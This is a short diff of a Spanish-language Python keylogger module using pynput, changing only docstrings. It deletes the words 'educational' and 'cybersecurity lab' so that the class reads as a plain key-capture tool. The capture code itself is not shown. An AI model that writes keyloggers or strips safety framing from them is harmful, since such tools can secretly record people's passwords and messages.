@@ -1,6 +1,6 @@
 """
-Módulo de keylogger educativo
-Propósito educativo: Entender cómo funcionan los keyloggers
+Módulo de keylogger
+Propósito: Captura de teclas para análisis de seguridad
 """
 
 from pynput import keyboard
@@ -10,7 +10,7 @@ import time
 
 class Keylogger:
     """
-    Keylogger educativo para laboratorio de ciberseguridad
+    Keylogger para captura de teclas
     Captura teclas presionadas y las almacena en un buffer
     """
     
